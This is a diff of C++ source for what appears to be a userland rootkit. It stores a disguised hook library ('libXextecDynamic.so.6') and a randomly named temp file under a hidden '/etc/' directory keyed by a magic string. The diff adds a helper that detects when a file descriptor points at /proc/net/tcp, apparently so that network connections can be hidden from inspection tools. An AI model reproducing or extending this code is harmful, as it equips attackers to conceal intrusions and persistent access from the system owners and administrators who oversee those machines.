@@ -15,6 +15,7 @@
 #include <cstring>
 #include <cassert>
 #include <cstdlib>
+//#include <ctime>
 
 #include <unistd.h>
 #include <dirent.h>
@@ -44,7 +45,10 @@ const char *envShowValue = MAGIC_STRING;
 const char *dynCnfFileClear = "dynamic_cnf.txt";
 char created = '1', not_created = '0', writed = '1', not_writed = '0', separator = ' ';
 const char *hookLibraryNameClear = "libXextecDynamic.so.6";
-#define hookLibraryName ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + hookLibraryNameClear)
+#define hookLibraryName ("/etc/" + std::string (MAGIC_STRING) + std::string ("/") + hookLibraryNameClear)
+const char *tcp4Path = "/proc/net/tcp";
+const char *tmpNtwFileNameClear = "aslcviu7ewge123coderthj";
+#define tmpNtwFileName ("/etc/" + std::string (MAGIC_STRING) + std::string ("/") + tmpNtwFileNameClear)
 
 //
 // Prototypes of functions, constants
@@ -71,6 +75,23 @@ const int nameSize = 512;
 //
 // Classes, structures and functions
 //
+bool haveTcp4Relation (int fd) {
+	typedef typename std::string::size_type StrType;
+	StrType nposVal = std::string::npos, pos1, pos2, pos3;
+	std::string lnkAim;
+	
+	// to check /proc/net/tcp and /proc/PID/net/tcp
+	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
+	
+	pos1 = lnkAim.find ("/proc");
+	pos2 = lnkAim.find ("/net");
+	pos3 = lnkAim.find ("/tcp");
+	
+	if (pos1 != nposVal && pos2 != nposVal && pos3 != nposVal) return true;
+	
+	return false;
+}
+
 std::string getCwdEasy () {
 	int strSz = 16, i = 1;
 	std::string tmp;
